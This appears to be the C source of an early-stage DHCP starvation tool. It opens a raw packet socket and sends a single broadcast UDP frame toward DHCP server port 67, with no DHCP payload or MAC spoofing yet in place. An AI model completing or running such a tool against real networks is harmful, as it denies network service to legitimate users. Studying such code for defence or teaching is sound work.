#include <stdio.h>
#include <stdlib.h>
#include <stdio.h>
#include <stdbool.h>
#include <string.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <linux/if_packet.h>
#include <linux/if_ether.h>
#include "dstar.h"
#include "../lib/argsx.h"
#include "../lib/netdhelper.h"
#include "../lib/dhcphelper.h"
#include "../lib/ipv4helper.h"
#include "../lib/udphelper.h"

void usage()
{
    printf("\n%s V: %s\n", APPNAME, VERSION);
    printf("Use: %s [OPTION]...\n"
                   "DHCP starvation.\n", APPNAME);
}

int main(int argc, char **argv)
{
    unsigned char buff[ETHHDRSIZ+IPV4HDRSIZE+UDPHDRSIZE]; /* TO WIRE :D */
    struct eth_header *ethernet = (struct eth_header*) buff;
    struct ipv4_header *ipv4 = (struct ipv4_header*) (buff+ETHHDRSIZ);
    struct udp_header *udp = (struct udp_header*) (buff+ETHHDRSIZ+IPV4HDRSIZE);
    struct sockaddr hwaddr;
    struct in_addr ipaddr;
    struct sockaddr_ll iface;

    int sock;
    char *tmp ="wlo1";

    // Open Socket
    if((sock=socket(PF_PACKET,SOCK_RAW,htons(ETH_P_ALL)))<0)
        return -1;

    memset(buff,0x00,ETHHDRSIZ+IPV4HDRSIZE+UDPHDRSIZE);
    // Build ETHERNET header
    memset(ethernet->dhwaddr,0xFF,IFHWADDRLEN); /* broadcast mac */
    ethernet->eth_type=htons(ETH_P_IP);
    if(get_hwaddr(sock,tmp,&hwaddr)==false)
        return -1;
    memcpy(ethernet->shwaddr,hwaddr.sa_data,IFHWADDRLEN);

    // Build IPv4 header
    ipv4->version=IPV4VERSION;
    ipv4->ihl=5;
    ipv4->dscp=0;
    ipv4->ecn=0;
    ipv4->len=IPV4HDRSIZE+UDPHDRSIZE;
    ipv4->id= htons(54321);
    ipv4->ttl = 64; // hops
    ipv4->protocol = IPPROTO_UDP; // UDP
    parse_ipv4addr("255.255.255.255",&ipaddr);
    ipv4->daddr=ipaddr.s_addr;
    ipv4_checksum(ipv4);

    // Build udp header
    build_udp_header(udp,68,67,0);

    build_sockaddr_ll(&iface,tmp,&hwaddr);

    if(sendto(sock,buff,ETHHDRSIZ+IPV4HDRSIZE+UDPHDRSIZE,0,(struct sockaddr*)&iface,sizeof(struct sockaddr_ll))<=0)
        return -1;

    return 0;
}

